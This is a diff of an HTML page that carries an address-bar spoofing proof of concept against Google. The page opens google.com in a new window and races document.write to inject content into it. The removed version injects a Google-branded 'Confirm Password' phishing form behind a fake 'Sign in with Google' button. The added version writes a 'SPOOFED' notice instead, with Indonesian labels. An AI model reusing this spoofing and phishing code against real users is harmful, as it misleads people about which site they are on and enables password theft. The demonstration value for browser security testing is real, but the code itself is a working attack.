@@ -2,52 +2,27 @@
 <html>
 
 <head>
-    <title>Google Authentication</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            text-align: center;
-            padding-top: 100px;
-        }
-
-        .btn {
-            padding: 15px 30px;
-            background: #4285f4;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-    </style>
+    <title>Spoofing Test</title>
 </head>
 
 <body>
-
-    <button class="btn" onclick="exploit()">Sign in with Google</button>
+    <button onclick="doSpoof()" style="padding:20px;">Jalankan Spoof Ke Google</button>
 
     <script>
-        function exploit() {
+        function doSpoof() {
             let win = window.open("https://www.google.com/", "_blank");
-            let attempts = 0;
-            let hackInterval = setInterval(() => {
-                attempts++;
+            let i = 0;
+            let timer = setInterval(() => {
+                i++;
                 try {
-                    win.document.write(`
-              <html>
-              <body style="text-align:center;font-family:arial;">
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-                <h2>Confirm Password</h2>
-                <input type="password" id="p" placeholder="Password" style="width:200px;padding:10px;"><br><br>
-                <button onclick="alert(document.getElementById('p').value)" style="background:#1a73e8;color:white;border:none;padding:10px 20px;">Next</button>
-              </body>
-              </html>
-            `);
-                    win.document.close();
-                    clearInterval(hackInterval);
-                    console.log("Injeksi tembus pada attempt ke-" + attempts);
+                    win.document.write("<h1>SPOOFED: Ini bukan Google</h1>");
+                    win.document.write("<p>Tapi liat Address Bar di atas, tulisannya apa?</p>");
+                    win.stop();
+                    if (i > 10) {
+                        clearInterval(timer);
+                        win.document.close();
+                    }
                 } catch (e) {
-                    if (attempts > 100) clearInterval(hackInterval);
                 }
             }, 5);
         }
